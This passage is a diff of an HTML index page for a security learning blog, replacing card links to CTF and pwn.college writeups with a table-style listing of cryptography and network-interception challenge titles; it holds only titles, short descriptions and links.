-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">💉 Command Injection 5 — Writeup</h3>
-                            <a href="/writeups/web-security-07-cdmi5/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">💉 Command Injection 6 — Writeup</h3>
-                            <a href="/writeups/web-security-08-cdmi6/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Authentication Bypass 1 — Writeup</h3>
-                            <a href="/writeups/web-security-09-authentication-bypass1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔐 Authentication Bypass 2 — Writeup</h3>
-                            <a href="/writeups/web-security-10-authentication-bypass2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">💉 SQL Injection 1 — Writeup</h3>
-                            <a href="/writeups/web-security-11-sqli1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">💉 SQL Injection 2 — Writeup</h3>
-                            <a href="/writeups/web-security-12-sqli2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">SQLi 3 — Writeup</h3>
-                            <a href="/writeups/web-security-13-sqli3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">SQL Injection 4 — Writeup</h3>
-                            <a href="/writeups/web-security-14-sqli4/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">SQL Injection 5 — Writeup</h3>
-                            <a href="/writeups/web-security-15-sqli5/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛡️ Web — XSS1 — Writeup</h3>
-                            <a href="/writeups/web-security-16-xss1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">XSS 2 — Writeup</h3>
-                            <a href="/writeups/web-security-17-xss2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">XSS 3 — Writeup</h3>
-                            <a href="/writeups/web-security-18-xss3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛡️ XSS 4 — Writeup</h3>
-                            <a href="/writeups/web-security-19-xss4/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛡️ XSS 5 — Writeup</h3>
-                            <a href="/writeups/web-security-20-xss5/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛡️ XSS 6 — Writeup</h3>
-                            <a href="/writeups/web-security-21-xss6/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">XSS-7 Write-up — pwn.college</h3>
-                            <a href="/writeups/web-security-22-xss7/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">💉 CSRF 1 — Writeup</h3>
-                            <a href="/writeups/web-security-23-csrf1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">CSRF-2 Write-up — pwn.college</h3>
-                            <a href="/writeups/web-security-24-csrf2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">CSRF-3 Write-up — pwn.college</h3>
-                            <a href="/writeups/web-security-25-csrf3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">CSRF-4 Write-up — pwn.college</h3>
-                            <a href="/writeups/web-security-26-csrf4/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">CSRF-5 — Writeup</h3>
-                            <a href="/writeups/web-security-27-csrf5/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                </div>
-            
-        
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 1.5rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // exploit.education
-        </h2>
-
-        
-        
-        
-            
-            
-                <h3 style="margin-top: 2rem; margin-bottom: 1.5rem; color: var(--text-muted); font-size: 1.3rem;">
-                    <span style="color: var(--accent-purple);">-></span> Nebula <span style="font-size: 0.9rem;">[7 Writeups]</span>
-                </h3>
-                <div class="grid" style="margin-bottom: 2rem;">
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 00</h3>
-                            <a href="/writeups/exploit-education-nebula-level00/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 01</h3>
-                            <a href="/writeups/exploit-education-nebula-level01/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 02</h3>
-                            <a href="/writeups/exploit-education-nebula-level02/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 03</h3>
-                            <a href="/writeups/exploit-education-nebula-level03/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 04</h3>
-                            <a href="/writeups/exploit-education-nebula-level04/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 05</h3>
-                            <a href="/writeups/exploit-education-nebula-level05/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Level 06</h3>
-                            <a href="/writeups/exploit-education-nebula-level06/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                </div>
-            
-        
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 1.5rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // pwnable.tw
-        </h2>
-
-        
-        
-        
-            
-            
-                <h3 style="margin-top: 2rem; margin-bottom: 1.5rem; color: var(--text-muted); font-size: 1.3rem;">
-                    <span style="color: var(--accent-purple);">-></span>  <span style="font-size: 0.9rem;">[2 Writeups]</span>
-                </h3>
-                <div class="grid" style="margin-bottom: 2rem;">
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">ORW</h3>
-                            <a href="/writeups/pwnable-tw-orw/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Start</h3>
-                            <a href="/writeups/pwnable-tw-start/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                </div>
-            
-        
-    
-
-    <!-- CTFs Section -->
-    <h1 style="margin-top: 6rem; margin-bottom: 0.5rem; color: var(--accent-cyan); font-family: var(--font-mono); font-size: 2.5rem;">Capture The Flag</h1>
-    <p style="margin-bottom: 3rem;">Writeups from live competitive CTF events.</p>
-
-    
-    
-
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 2rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // ImaginaryCTF 2025 <span style="font-size: 1rem; color: var(--text-muted); float: right;">[3 Writeups]</span>
-        </h2>
-        
-        <div class="grid" style="margin-bottom: 4rem;">
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">ImaginaryCTF Forensic - obsuct</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Writeup from ImaginaryCTF 2025</p>
-                    <a href="/writeups/imaginaryctf-2025-fore-obsuct/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">ImaginaryCTF Forensics - wave</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Writeup from ImaginaryCTF 2025</p>
-                    <a href="/writeups/imaginaryctf-2025-fore-wave/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">rev-weird-app</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Writeup from ImaginaryCTF 2025</p>
-                    <a href="/writeups/imaginaryctf-2025-rev-weird-app/" class="view-btn">Read More</a>
-                </div>
-            
-        </div>
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 2rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // Nullcon HackIM 2025 <span style="font-size: 1rem; color: var(--text-muted); float: right;">[1 Writeups]</span>
-        </h2>
-        
-        <div class="grid" style="margin-bottom: 4rem;">
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Nullcon Berlin HackIM 2025 CTF – Misc: USB Storage</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Writeup from Nullcon Berlin HackIM 2025 CTF</p>
-                    <a href="/writeups/nullcon-berlin-hackim-2025-ctf-misc-usbstorage/" class="view-btn">Read More</a>
-                </div>
-            
-        </div>
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 2rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // TCS Hackquest S10 Round 1 <span style="font-size: 1rem; color: var(--text-muted); float: right;">[9 Writeups]</span>
-        </h2>
-        
-        <div class="grid" style="margin-bottom: 4rem;">
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Address Abyss</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Reconstruct a flag by extracting positional characters embedded within IPv4 and IPv6 network logs.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-address-abyss/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Catch Me If You Bot</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Bypass a time-limited challenge by extracting hidden paths and utilizing a custom user-agent.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-catch-me-if-you-bot/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Hidden Layers</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Extract hidden data using LSB steganography on a PNG image.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-hidden-layers/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Know Meh Better</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Decompile a PyInstaller executable to reverse engineer an XOR encryption routine and recover a hidden base64-encoded flag.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-know-me-better/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Noise</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Identify a hidden string in a noisy binary file using strings and grep.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-noise/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Paper Scripts</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Extract a hidden flag from malicious JavaScript embedded within a PDF file.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-paper-scripts/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Seeds of Time</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Exploit a predictable PRNG seed (Unix timestamp) to decrypt the flag.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-seeds-of-time/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">StackFall</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Exploit a classic buffer overflow vulnerability to overwrite a variable and execute a win() function.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-stackfall/" class="view-btn">Read More</a>
-                </div>
-            
-                <div class="card">
-                    <h3 style="font-size: 1.2rem;">Synthetic Stacks</h3>
-                    <p style="margin-top: 1rem; margin-bottom: 1.5rem; font-size: 0.9rem;">Crack a password-protected 7z archive disguised as an MSI and decode a base64 payload to reveal a QR code.</p>
-                    <a href="/writeups/tcs-hackquest-s10-r1-synthetic-stacks/" class="view-btn">Read More</a>
-                </div>
-            
-        </div>
-    
+    <div class="page-container">
+        <div style="margin-bottom: 2rem;">
+    <h1 style="margin-bottom: 0.5rem; color: var(--text-bright);">Capture the Flag Walkthroughs</h1>
+    <p style="color: var(--text-muted);">Detailed technical walkthroughs focusing on binary exploitation and reverse engineering.</p>
 </div>
 
-    </main>
+<!-- Educational Platforms -->
+<div class="docked-window">
+    <div class="window-header">
+        <span>Educational Platforms</span>
+        <span class="tag">Filter: major_type=Platform</span>
+    </div>
+    <div class="window-body padded">
+        
+        
+
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 0; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                Cryptopals
+            </h2>
+
+            
+            
+            
+                <div class="ida-list-wrapper">
+                    <table class="ida-list">
+                        <thead>
+                            <tr>
+                                <th>Address</th>
+                                <th>Function Name</th>
+                                <th>Segment</th>
+                                <th>Date</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            
+                            <tr>
+                                <td class="ida-addr">0x194305</td>
+                                <td class="ida-name">
+                                    <a href="/writeups/chall1-code/">Code</a>
+                                    
+                                </td>
+                                <td class="ida-seg">.platform</td>
+                                <td class="ida-date">2026/04/27</td>
+                            </tr>
+                            
+                            <tr>
+                                <td class="ida-addr">0x194306</td>
+                                <td class="ida-name">
+                                    <a href="/writeups/chall2-code/">Code</a>
+                                    
+                                </td>
+                                <td class="ida-seg">.platform</td>
+                                <td class="ida-date">2026/04/27</td>
+                            </tr>
+                            
+                            <tr>
+                                <td class="ida-addr">0x194307</td>
+                                <td class="ida-name">
+                                    <a href="/writeups/chall3-code/">--------------------------------------------------</a>
+                                    
+                                </td>
+                                <td class="ida-seg">.platform</td>
+                                <td class="ida-date">2026/04/27</td>
+                            </tr>
+                            
+                            <tr>
+                                <td class="ida-addr">0x194308</td>
+                                <td class="ida-name">
+                                    <a href="/writeups/chall4-code/">Code</a>
+                                    
+                                </td>
+                                <td class="ida-seg">.platform</td>
+                                <td class="ida-date">2026/04/27</td>
+                            </tr>
+                            
+                            <tr>
+                                <td class="ida-addr">0x194309</td>
+                                <td class="ida-name">
+                                    <a href="/writeups/chall5-code/">Code</a>
+                                    
+                                </td>
+                                <td class="ida-seg">.platform</td>
+                                <td class="ida-date">2026/04/27</td>
+                            </tr>
+                            
+                        </tbody>
+                    </table>
+                </div>
+            
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 2rem; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                pwn.college
+            </h2>
+
+            
+            
+            
+                
+                
+                    <h3 style="font-family: var(--font-mono); font-size: 0.95rem; color: var(--text-bright); margin-top: 1rem; margin-bottom: 0.5rem;">
+                        <span style="color: var(--syn-danger);">-></span> Cryptography <span style="color: var(--text-muted); font-size: 0.8rem;">[7 items]</span>
+                    </h3>
+                    <div class="ida-list-wrapper">
+                        <table class="ida-list">
+                            <thead>
+                                <tr>
+                                    <th>Address</th>
+                                    <th>Function Name</th>
+                                    <th>Segment</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194305</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-01-xor/">🧠 XOR 101 — Intro to Bitwise Crypto</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194306</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-02-xoring-hex/">🔐 XORing Hex — Practice XOR with Hex Values</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194307</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-03-xoring-ascii/">🔤 XORing ASCII — XORing Characters Byte by Byte</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194308</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-04-xoring-ascii-strings/">🔡 XORing ASCII Strings — Full-String XOR Practice</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194309</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-05-one-time-padding/">🔐 One-Time Pad Decryption</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194310</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-06-one-time-pad-tamper/">🔐 One-Time Pad Tampering — Integrity Flaw Exploit</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194311</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/cryptography-07-many-time-pad/">🧠 Many-time Pad — Cryptography Challenge Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                            </tbody>
+                        </table>
+                    </div>
+                
+                    <h3 style="font-family: var(--font-mono); font-size: 0.95rem; color: var(--text-bright); margin-top: 1rem; margin-bottom: 0.5rem;">
+                        <span style="color: var(--syn-danger);">-></span> Intercepting Communication <span style="color: var(--text-muted); font-size: 0.8rem;">[29 items]</span>
+                    </h3>
+                    <div class="ida-list-wrapper">
+                        <table class="ida-list">
+                            <thead>
+                                <tr>
+                                    <th>Address</th>
+                                    <th>Function Name</th>
+                                    <th>Segment</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194305</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-01-connect/">🌐 Connect – Writeup (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194306</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-02-send/">🌐 Connect – Message Sending (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194307</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-03-shutdown/">🚩 Challenge: Shutdown</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194308</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-04-listen/">🔊 Challenge: Listen</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194309</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-05-scan1/">🔍 Scan1 Challenge</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194310</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-06-scan1/">🛰️ Scan2 Challenge — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194311</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-07-monitor1/">Monitor1 - Monitor Traffic from a Remote Host</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194312</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-08-monitor2/">🧪 Monitor2 Challenge – pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194313</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-09-sniffing-cookies/">Cookie-Sniffer 🕵️‍♂️🍪</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194314</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-10-network-configuration/">Network-Configuration 🌐🔧</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194315</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-11-firewall1/">Firewall1 🔥🧱</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194316</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-12-firewall2/">Firewall2 🔥🧱🎯</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194317</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-13-firewall3/">Firewall3 🔥📤🧱</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194318</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-14-denial-of-service-1/">📌 Challenge Summary</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194319</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-15-denial-of-service-2/">🧨 Challenge Writeup: `dos2`</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194320</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-16-denial-of-service-3/">Denial-of-service-3 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194321</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-17-ethernet/">📡 Ethernet — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194322</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-18-ip/">🌐 Internet Protocol Packet — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194323</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-19-tcp/">🔌 Transmission Control Protocol Packet — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194324</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-20-tcp-handshake/">🤝 TCP Three-Way Handshake — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194325</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-21-udp/">🛰️ UDP Challenge – 'First UDP Interaction'</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194326</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-22-udp2/">📡 UDP2 – 'Set the Source Port'</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194327</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-23-udp-spoofing-1/">✅ UDP-Spoofing-1 Challenge</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194328</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-24-udp-spoofing-2/">🛰️ UDP-spoofing-2 (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194329</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-25-udp-spoofing-3/">🛰️ UDP Spoofing 3 – Writeup (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194330</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-26-udp-spoofing-4/">🛰️ UDP Spoofing 4 – Writeup (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194331</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-27-arp/">🧠 CTF Writeup: Manual ARP Packet Injection</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194332</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-28-intercept/">🛰️ Intercept – Writeup (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194333</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/intercepting-communication-29-mitm/">🕵️‍♂️ Man-in-the-Middle – Writeup (pwn.college)</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                            </tbody>
+                        </table>
+                    </div>
+                
+                    <h3 style="font-family: var(--font-mono); font-size: 0.95rem; color: var(--text-bright); margin-top: 1rem; margin-bottom: 0.5rem;">
+                        <span style="color: var(--syn-danger);">-></span> Program Misuse <span style="color: var(--text-muted); font-size: 0.8rem;">[49 items]</span>
+                    </h3>
